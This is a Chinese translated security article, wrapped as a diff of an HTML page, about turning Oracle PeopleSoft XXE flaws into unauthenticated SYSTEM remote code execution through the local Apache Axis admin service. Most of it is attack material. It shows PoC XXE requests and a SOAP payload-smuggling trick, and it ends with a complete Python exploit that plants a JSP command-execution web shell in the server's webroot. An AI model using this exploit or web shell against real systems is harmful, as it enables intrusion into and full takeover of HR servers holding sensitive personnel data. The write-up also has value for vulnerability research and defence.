@@ -1,0 +1,596 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p><strong>几个月前，我有幸参与几个Oracle PeopleSoft建设项目的安全审计，审计对象主要为PeopleSoft系列的人力资源管理系统（HRMS）和开发工具包（PeopleTool）。纵观网上关于PeopleSoft的安全资料，除了几个无法证实的CVE漏洞参考之外，就只有ERPScan在两年前HITB会议的一个信息量极大的演讲。根据ERPScan的演讲PDF我发现，尽管网上鲜有PeopleSoft的安全信息，但它其实漏洞重重。</strong></p>
+<p>仅从我随手的安全测试来看，PeopleSoft应用程序包含很多不经验证授权的服务端点，可能出于高交互性，这些服务端中大部分都使用了默认密码。这种脆弱的安全环境明摆着给攻击者敞开了门窗。在这篇文章中，我将展示如何利用一个XXE漏洞提权以执行系统命令，该问题可能影响当前所有PeopleSoft版本软件。</p>
+<h2 data-content="1" id="1eba63278734a6dfa6d6a35d7c6ccd45">XXE漏洞：获取本地网络访问权限</h2>
+<p>PeopleSoft存在多个XXE漏洞，如早几年的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3800" target="_blank">CVE-2013-3800</a>和<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3821" target="_blank">CVE-2013-3821</a>，最新的为ERPScan发现的<a href="https://erpscan.com/advisories/erpscan-17-020-xxe-via-doctype-peoplesoft/" target="_blank">CVE-2017-3548</a>。通常来说，可以利用这些漏洞获得PeopleSoft和WebLogic控制端的密码信息，但在该测试环境中这种方法的成功实现需要一定难度。另外，由于CVE-2017-3548为Bind-XXE漏洞，而且我认为目标网络系统可能部署有防火墙，所以，利用XXE漏洞窃取系统信息并不像想像中的那么简单。在这里，我们一起来看看CVE-2013-3821和CVE-2017-3548的PoC利用代码：</p>
+<h3 data-content="1" id="13dc8936d0fb0cc9885165f549c2459b">CVE-2013-3821：集成网关HttpListeningConnector XXE</h3>
+<pre><code>POST /PSIGW/HttpListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE IBRequest [
+&lt;!ENTITY x SYSTEM "http://localhost:51420"&gt;
+]&gt;
+&lt;IBRequest&gt;
+   &lt;ExternalOperationName&gt;&amp;x;&lt;/ExternalOperationName&gt;
+   &lt;OperationType/&gt;
+   &lt;From&gt;&lt;RequestingNode/&gt;
+      &lt;Password/&gt;
+      &lt;OrigUser/&gt;
+      &lt;OrigNode/&gt;
+      &lt;OrigProcess/&gt;
+      &lt;OrigTimeStamp/&gt;
+   &lt;/From&gt;
+   &lt;To&gt;
+      &lt;FinalDestination/&gt;
+      &lt;DestinationNode/&gt;
+      &lt;SubChannel/&gt;
+   &lt;/To&gt;
+   &lt;ContentSections&gt;
+      &lt;ContentSection&gt;
+         &lt;NonRepudiation/&gt;
+         &lt;MessageVersion/&gt;
+         &lt;Data&gt;&lt;![CDATA[&lt;?xml version="1.0"?&gt;your_message_content]]&gt;
+         &lt;/Data&gt;
+      &lt;/ContentSection&gt;
+   &lt;/ContentSections&gt;
+&lt;/IBRequest&gt;</code></pre>
+<h3 data-content="1" id="50de6d39e51ac6cedb06232952fd9942">CVE-2017-3548：集成网关PeopleSoftServiceListeningConnector XXE</h3>
+<pre><code>POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows"&gt;</code></pre>
+<p>换个思路考虑一下，我觉得可以利用XXE漏洞来访问本地服务器localhost的各种服务，或许这还能绕过防火墙规则或身份验证检查。因此，在这里只需要知道PeopleSoft的服务端口即可。最终，我通过获取其访问主页服务的cookie识别了端口信息：</p>
+<pre><code>Set-Cookie: SNP2118-51500-PORTAL-PSJSESSIONID=9JwqZVxKjzGJn1s5DLf1t46pz91FFb3p!-1515514079;</code></pre>
+<p>可以看出，当前PeopleSoft的服务端口为5100，可以通过&lt;<a href="http://localhost:51500/&gt;方式访问到相应的应用程序。" target="_blank">http://localhost:51500/&gt;方式访问到相应的应用程序。</a></p>
+<h2 data-content="1" id="1f68f0dfb5fba0e8fe1a7c006ecac012">Apache Axis服务的利用</h2>
+<p>在PeopleSoft服务架构中，其中一个未经验证授权的服务为通过<strong>*<a href="http://website.com/pspc/services*" target="_blank">http://website.com/pspc/services*</a></strong>方式访问的Apache Axis 1.4。该Apache Axis服务允许我们从Java类中构建SOAP终端，然后利用生成的Web服务描述语言（WSDL）配合辅助代码实现与这些终端进行交互。我们可以通过<em><a href="http://website.com/pspc/services/AdminSer" target="_blank">http://website.com/pspc/services/AdminSer</a></em>vice对Apache Axis服务进行管理：</p>
+<p><a href="http://image.3001.net/images/20170522/14954272097383.png" target="_blank"><img src="http://image.3001.net/images/20170522/14954272097383.png!small"/></a></p>
+<p>以下为Apache Axis管理员基于<strong>java.util.Random</strong>类创建SOAP服务端的POST代码，从该代码中，我们可以看到一些具体的服务创建方式：</p>
+<pre><code>POST /pspc/services/AdminService
+Host: website.com
+SOAPAction: something
+Content-Type: application/xml
+...
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;ns1:deployment
+            xmlns="http://xml.apache.org/axis/wsdd/"
+            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
+            xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
+            &lt;ns1:service name="RandomService" provider="java:RPC"&gt;
+                &lt;ns1:parameter name="className" value="java.util.Random"/&gt;
+                &lt;ns1:parameter name="allowedMethods" value="*"/&gt;
+            &lt;/ns1:service&gt;
+        &lt;/ns1:deployment&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>由于java.util.Random类中的每一个公用方法都可以作为一个服务来使用，因此，我们可以通过SOAP来调用<strong>Random.nextInt()</strong>方法，其请求的POST代码如下：</p>
+<pre><code>POST /pspc/services/RandomService
+Host: website.com
+SOAPAction: something
+Content-Type: application/xml
+...
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;api:nextInt /&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>之后，会产生以下响应信息，这些信息对应了XML方式的一些设置：</p>
+<pre><code>HTTP/1.1 200 OK
+...
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;soapenv:Envelope
+    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;ns1:nextIntResponse
+            soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+            xmlns:ns1="http://127.0.0.1/Integrics/Enswitch/API"&gt;
+            &lt;nextIntReturn href="#id0"/&gt;
+        &lt;/ns1:nextIntResponse&gt;
+        &lt;multiRef id="id0" soapenc:root="0"
+            soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+            xsi:type="xsd:int"
+            xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+            1244788438 &lt;!-- Here's our random integer --&gt;
+        &lt;/multiRef&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>虽然该管理终端对外部IP地址进行了屏蔽，但通过localhost本地访问时却不需要输入任何验证密码。因此，这理所当然地成为了我们的一个渗透突破口。但是，由于我们将要利用的是XXE漏洞，需要通过构造GET方式获取相关信息，因此可以参考以上创建服务和调用方法的POST请求，在后续与服务器的交互过程中，将我们特定的SOAP Payload攻击载荷转换为GET请求发送给主机服务器，最终尝试获得一些有用信息。</p>
+<h2 data-content="1" id="a8491b94fbdee7908a0318df06bf909a">Axis: 参考POST请求构造GET形式的SOAP Payload</h2>
+<p>Axis API允许发送GET请求，它首先会接收给定的URL参数，然后再将这些参数转换为一个SOAP Payload。通过分析发现，在Axis源代码中，有一段方法代码可以把GET参数转换为有效的XML  Payload，该方法代码如下：</p>
+<pre><code>public class AxisServer extends AxisEngine {
+    [...]
+    {
+        String method = null;
+        String args = "";
+        Enumeration e = request.getParameterNames();
+
+        while (e.hasMoreElements()) {
+            String param = (String) e.nextElement();
+            if (param.equalsIgnoreCase ("method")) {
+                method = request.getParameter (param);
+            }
+
+            else {
+                args += "&lt;" + param + "&gt;" + request.getParameter (param) +
+                        "&lt;/" + param + "&gt;";
+            }
+        }
+
+        String body = "&lt;" + method + "&gt;" + args + "&lt;/" + method + "&gt;";
+        String msgtxt = "&lt;SOAP-ENV:Envelope" +
+                " xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;" +
+                "&lt;SOAP-ENV:Body&gt;" + body + "&lt;/SOAP-ENV:Body&gt;" +
+                "&lt;/SOAP-ENV:Envelope&gt;";
+    }
+}</code></pre>
+<p>为了更好地理解它的转换机制 ，我们来看这个示例：</p>
+<pre><code>GET /pspc/services/SomeService
+     ?method=myMethod
+     ¶meter1=test1
+     ¶meter2=test2</code></pre>
+<p>以上GET请求等同于XML形式的设置如下：</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;myMethod&gt;
+            &lt;parameter1&gt;test1&lt;/parameter1&gt;
+            &lt;parameter2&gt;test2&lt;/parameter2&gt;
+        &lt;/myMethod&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>然而，当我们尝试使用这种方法来创建一个新的服务端时却出现了一个问题：在代码层面，我们定义的XML标签必须要设置属性。因此，当我们像如下方式在GET请求中添加了XML标签属性之后：</p>
+<pre><code>GET /pspc/services/SomeService
+     ?method=myMethod+attr0="x"
+     ¶meter1+attr1="y"=test1
+     ¶meter2=test2</code></pre>
+<p>得到的相应XML设置信息如下：</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;myMethod attr0="x"&gt;
+            &lt;parameter1 attr1="y"&gt;test1&lt;/parameter1 attr1="y"&gt;
+            &lt;parameter2&gt;test2&lt;/parameter2&gt;
+        &lt;/myMethod attr0="x"&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>很显然，注意查看红框标记，该文件是个无效的XML文件，其直观在在浏览器中的运行结果是这样的：</p>
+<p><a href="http://image.3001.net/images/20170522/14954277066387.jpg" target="_blank"><img src="http://image.3001.net/images/20170522/14954277066387.jpg!small"/></a></p>
+<p>当然，其对服务器的请求最终也是无效的。但如果我们像下面这样把整个Payload放到方法参数中：</p>
+<pre><code>GET /pspc/services/SomeService
+     ?method=myMethod+attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod</code></pre>
+<p>将会得到如下的XML设置信息：</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
+        &lt;/myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>请注意观察，我们的Payload信息会被两次进行解析设置，第一次解析的前缀为“<strong>&lt;</strong>”，第二次为“<strong>&lt;/</strong>”。为了实现一次解析，我们可以使用以下XML注释方法来解决：</p>
+<pre><code>GET /pspc/services/SomeService
+     ?method=!--&gt;&lt;myMethod+attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod</code></pre>
+<p>之后，可以得到正常有效的如下XML设置信息：</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soapenv:Body&gt;
+        &lt;!--&gt;&lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
+        &lt;/!--&gt;&lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<p>在<strong>&lt;soapenv:Body&gt;</strong>当中，由于我们之前在GET信息中添加了“!–&gt;”前缀，所以首个Payload以XML注释的起始标记“&lt;!–”开头，第二个Payload却是以XML注释结束标记&lt;/!–&gt;开始的，这也意味着在&lt;!–&gt;和&lt;/!–&gt;之间的Payload将会被注释掉，我们预计要执行的在&lt;/!–&gt;之后的Payload将会成功一次解析执行。</p>
+<p>由此，我们就可以将任意的SOAP请求从原先的POST方式转化为XXE漏洞可以利用的GET方式了，同时也就意味着，我们可以利用XXE漏洞绕过IP检查机制，将任意类上传部署为Axis  Service使用。</p>
+<h2 data-content="1" id="6670ed5219979dc98ec496fa51dc81e2">Axis: 源码分析后的缺陷方法利用</h2>
+<p>在服务部署时，Apache Axis不允许我们上传自己设置的Javz类，只能使用系统提供的服务类。在对<a href="http://infocenter.ibi.com/wf8006/index.jsp?topic=%2Fpubdocs%2FOPS%2FOpen_Portal%2Fsource%2Ftopic19.htm" target="_blank">PeopleSoft中包含Axis实例的pspc.war包文件进行分析</a>之后，我发现org.apache.pluto.portalImpl包中的部署类包含了一些很有意思且可以利用的方法。比如，<strong>addToEntityReg(String[]args)</strong>方法允许在XML文件结尾添加任意数据，另外，<strong>copy(file1, file2)</strong>方法还允许我们进行任意复制拷贝。这两个方法缺陷足以让我们向服务器中部署包含JSP Payload的XML文件，并把其拷贝到webroot目录下，从而获取到系统的控制shell。</p>
+<p>正如预想的那样，利用这种方法，配合XXE漏洞，我们最终从PeopleSoft中获得了SYSTEM系统权限，实现任意命令执行目的。对PeopleSoft来说，这是一个严重的未授权验证远程系统命令执行漏洞。</p>
+<p><a href="http://image.3001.net/images/20170522/14954280768307.png" target="_blank"><img src="http://image.3001.net/images/20170522/14954280768307.png!small"/></a></p>
+<h2 data-content="1" id="1239c09d9a2b2bfa281b0e9105836ce9">EXPLOIT</h2>
+<p>目前，据我的分析和测试来看，该漏洞可能影响当前所有版本的PeopleSoft。经对以上方法思路的整理，最终总结出了以下可以进行安全测试的EXPLOIT。（代码具有危险性，请勿用于非法目的）：</p>
+<pre><code>#!/usr/bin/python3
+# Oracle PeopleSoft SYSTEM RCE
+# https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
+# cf
+# 2017-05-17
+
+import requests
+import urllib.parse
+import re
+import string
+import random
+import sys
+
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+try:
+    import colorama
+except ImportError:
+    colorama = None
+else:
+    colorama.init()
+
+    COLORS = {
+        '+': colorama.Fore.GREEN,
+        '-': colorama.Fore.RED,
+        ':': colorama.Fore.BLUE,
+        '!': colorama.Fore.YELLOW
+    }
+
+
+URL = sys.argv[1].rstrip('/')
+CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
+PROXY = 'localhost:8080'
+
+# shell.jsp?c=whoami
+PAYLOAD = '&lt;%@ page import="java.util.*,java.io.*"%&gt;&lt;% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%&gt;'
+
+
+class Browser:
+    """Wrapper around requests.
+    """
+
+    def __init__(self, url):
+        self.url = url
+        self.init()
+
+    def init(self):
+        self.session = requests.Session()
+        self.session.proxies = {
+            'http': PROXY,
+            'https': PROXY
+        }
+        self.session.verify = False
+
+    def get(self, url ,*args, **kwargs):
+        return self.session.get(url=self.url + url, *args, **kwargs)
+
+    def post(self, url, *args, **kwargs):
+        return self.session.post(url=self.url + url, *args, **kwargs)
+
+    def matches(self, r, regex):
+        return re.findall(regex, r.text)
+
+
+class Recon(Browser):
+    """Grabs different informations about the target.
+    """
+
+    def check_all(self):
+        self.site_id = None
+        self.local_port = None
+        self.check_version()
+        self.check_site_id()
+        self.check_local_infos()
+
+    def check_version(self):
+        """Grabs PeopleTools' version.
+        """
+        self.version = None
+        r = self.get('/PSEMHUB/hub')
+        m = self.matches(r, 'Registered Hosts Summary - ([0-9\.]+).&lt;/b&gt;')
+
+        if m:
+            self.version = m[0]
+            o(':', 'PTools version: %s' % self.version)
+        else:
+            o('-', 'Unable to find version')
+
+    def check_site_id(self):
+        """Grabs the site ID and the local port.
+        """
+        if self.site_id:
+            return
+
+        r = self.get('/')
+        m = self.matches(r, '/([^/]+)/signon.html')
+
+        if not m:
+            raise RuntimeError('Unable to find site ID')
+
+        self.site_id = m[0]
+        o('+', 'Site ID: ' + self.site_id)
+
+    def check_local_infos(self):
+        """Uses cookies to leak hostname and local port.
+        """
+        if self.local_port:
+            return
+
+        r = self.get('/psp/%s/signon.html' % self.site_id)
+
+        for c, v in self.session.cookies.items():
+            if c.endswith('-PORTAL-PSJSESSIONID'):
+                self.local_host, self.local_port, *_ = c.split('-')
+                o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
+                return
+
+        raise RuntimeError('Unable to get local hostname / port')
+
+
+class AxisDeploy(Recon):
+    """Uses the XXE to install Deploy, and uses its two useful methods to get
+    a shell.
+    """
+
+    def init(self):
+        super().init()
+        self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)
+
+    def random_string(self, size):
+        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
+
+    def url_service(self, payload):
+        return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
+            self.local_port,
+            urllib.parse.quote_plus(self.psoap(payload))
+        )
+
+    def war_path(self, name):
+        # This is just a guess from the few PeopleSoft instances we audited.
+        # It might be wrong.
+        suffix = '.war' if self.version and self.version &gt;= '8.50' else ''
+        return './applications/peoplesoft/%s%s' % (name, suffix)
+
+    def pxml(self, payload):
+        """Converts an XML payload into a one-liner.
+        """
+        payload = payload.strip().replace('\n', ' ')
+        payload = re.sub('\s+&lt;', '&lt;', payload, flags=re.S)
+        payload = re.sub('\s+', ' ', payload, flags=re.S)
+        return payload
+
+    def psoap(self, payload):
+        """Converts a SOAP payload into a one-liner, including the comment trick
+        to allow attributes.
+        """
+        payload = self.pxml(payload)
+        payload = '!--&gt;%s' % payload[:-1]
+        return payload
+
+    def soap_service_deploy(self):
+        """SOAP payload to deploy the service.
+        """
+        return """
+        &lt;ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
+        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
+        xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
+            &lt;ns1:service name="%s" provider="java:RPC"&gt;
+                &lt;ns1:parameter name="className" value="%s"/&gt;
+                &lt;ns1:parameter name="allowedMethods" value="*"/&gt;
+            &lt;/ns1:service&gt;
+        &lt;/ns1:deployment&gt;
+        """ % (self.service_name, CLASS_NAME)
+
+    def soap_service_undeploy(self):
+        """SOAP payload to undeploy the service.
+        """
+        return """
+        &lt;ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
+        xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
+        &lt;ns1:service name="%s"/&gt;
+        &lt;/ns1:undeployment&gt;
+        """ % (self.service_name, )
+
+    def xxe_ssrf(self, payload):
+        """Runs the given AXIS deploy/undeploy payload through the XXE.
+        """
+        data = """
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE IBRequest [
+        &lt;!ENTITY x SYSTEM "%s"&gt;
+        ]&gt;
+        &lt;IBRequest&gt;
+           &lt;ExternalOperationName&gt;&amp;x;&lt;/ExternalOperationName&gt;
+           &lt;OperationType/&gt;
+           &lt;From&gt;&lt;RequestingNode/&gt;
+              &lt;Password/&gt;
+              &lt;OrigUser/&gt;
+              &lt;OrigNode/&gt;
+              &lt;OrigProcess/&gt;
+              &lt;OrigTimeStamp/&gt;
+           &lt;/From&gt;
+           &lt;To&gt;
+              &lt;FinalDestination/&gt;
+              &lt;DestinationNode/&gt;
+              &lt;SubChannel/&gt;
+           &lt;/To&gt;
+           &lt;ContentSections&gt;
+              &lt;ContentSection&gt;
+                 &lt;NonRepudiation/&gt;
+                 &lt;MessageVersion/&gt;
+                 &lt;Data&gt;
+                 &lt;/Data&gt;
+              &lt;/ContentSection&gt;
+           &lt;/ContentSections&gt;
+        &lt;/IBRequest&gt;
+        """ % self.url_service(payload)
+        r = self.post(
+            '/PSIGW/HttpListeningConnector',
+            data=self.pxml(data),
+            headers={
+                'Content-Type': 'application/xml'
+            }
+        )
+
+    def service_check(self):
+        """Verifies that the service is correctly installed.
+        """
+        r = self.get('/pspc/services')
+        return self.service_name in r.text
+
+    def service_deploy(self):
+        self.xxe_ssrf(self.soap_service_deploy())
+
+        if not self.service_check():
+            raise RuntimeError('Unable to deploy service')
+
+        o('+', 'Service deployed')
+
+    def service_undeploy(self):
+        if not self.local_port:
+            return
+
+        self.xxe_ssrf(self.soap_service_undeploy())
+
+        if self.service_check():
+            o('-', 'Unable to undeploy service')
+            return
+
+        o('+', 'Service undeployed')
+
+    def service_send(self, data):
+        """Send data to the Axis endpoint.
+        """
+        return self.post(
+            '/pspc/services/%s' % self.service_name,
+            data=data,
+            headers={
+                'SOAPAction': 'useless',
+                'Content-Type': 'application/xml'
+            }
+        )
+
+    def service_copy(self, path0, path1):
+        """Copies one file to another.
+        """
+        data = """
+        &lt;?xml version="1.0" encoding="utf-8"?&gt;
+        &lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+        &lt;soapenv:Body&gt;
+        &lt;api:copy
+        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+            &lt;in0 xsi:type="xsd:string"&gt;%s&lt;/in0&gt;
+            &lt;in1 xsi:type="xsd:string"&gt;%s&lt;/in1&gt;
+        &lt;/api:copy&gt;
+        &lt;/soapenv:Body&gt;
+        &lt;/soapenv:Envelope&gt;
+        """.strip() % (path0, path1)
+        response = self.service_send(data)
+        return '&lt;ns1:copyResponse' in response.text
+
+    def service_main(self, tmp_path, tmp_dir):
+        """Writes the payload at the end of the .xml file.
+        """
+        data = """
+        &lt;?xml version="1.0" encoding="utf-8"?&gt;
+        &lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+        &lt;soapenv:Body&gt;
+        &lt;api:main
+        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+            &lt;api:in0&gt;
+                &lt;item xsi:type="xsd:string"&gt;%s&lt;/item&gt;
+                &lt;item xsi:type="xsd:string"&gt;%s&lt;/item&gt;
+                &lt;item xsi:type="xsd:string"&gt;%s.war&lt;/item&gt;
+                &lt;item xsi:type="xsd:string"&gt;something&lt;/item&gt;
+                &lt;item xsi:type="xsd:string"&gt;-addToEntityReg&lt;/item&gt;
+                &lt;item xsi:type="xsd:string"&gt;&lt;![CDATA[%s]]&gt;&lt;/item&gt;
+            &lt;/api:in0&gt;
+        &lt;/api:main&gt;
+        &lt;/soapenv:Body&gt;
+        &lt;/soapenv:Envelope&gt;
+        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
+        response = self.service_send(data)
+
+    def build_shell(self):
+        """Builds a SYSTEM shell.
+        """
+        # On versions &gt;= 8.50, using another extension than JSP got 70 bytes
+        # in return every time, for some reason.
+        # Using .jsp seems to trigger caching, thus the same pivot cannot be
+        # used to extract several files.
+        # Again, this is just from experience, nothing confirmed
+        pivot = '/%s.jsp' % self.random_string(20)
+        pivot_path = self.war_path('PSOL') + pivot
+        pivot_url = '/PSOL' + pivot
+
+        # 1: Copy portletentityregistry.xml to TMP
+
+        per = '/WEB-INF/data/portletentityregistry.xml'
+        per_path = self.war_path('pspc')
+        tmp_path = '../' * 20 + 'TEMP'
+        tmp_dir = self.random_string(20)
+        tmp_per = tmp_path + '/' + tmp_dir + per
+
+        if not self.service_copy(per_path + per, tmp_per):
+            raise RuntimeError('Unable to copy original XML file')
+
+        # 2: Add JSP payload
+        self.service_main(tmp_path, tmp_dir)
+
+        # 3: Copy XML to JSP in webroot
+        if not self.service_copy(tmp_per, pivot_path):
+            raise RuntimeError('Unable to copy modified XML file')
+
+        response = self.get(pivot_url)
+
+        if response.status_code != 200:
+            raise RuntimeError('Unable to access JSP shell')
+
+        o('+', 'Shell URL: ' + self.url + pivot_url)
+
+
+class PeopleSoftRCE(AxisDeploy):
+    def __init__(self, url):
+        super().__init__(url)
+
+
+def o(s, message):
+    if colorama:
+        c = COLORS[s]
+        s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
+    print('%s %s' % (s, message))
+
+
+x = PeopleSoftRCE(URL)
+
+try:
+    x.check_all()
+    x.service_deploy()
+    x.build_shell()
+except RuntimeError as e:
+    o('-', e)
+finally:
+    x.service_undeploy()</code></pre>
+<p>更多信息，请参考ERPScan<a href="https://erpscan.com/wp-content/uploads/presentations/2015-HITB-Amsterdam-Oracle-PeopleSoft-Applications-are-Under-Attack.pdf" target="_blank">《Oracle PeopleSoft applications are under attacks!》</a></p>
+<p><strong>*参考来源：ambionics**</strong>，freebuf小编clouds编译，转载请注明来自FreeBuf.COM**</p>
+</div>
+</div>
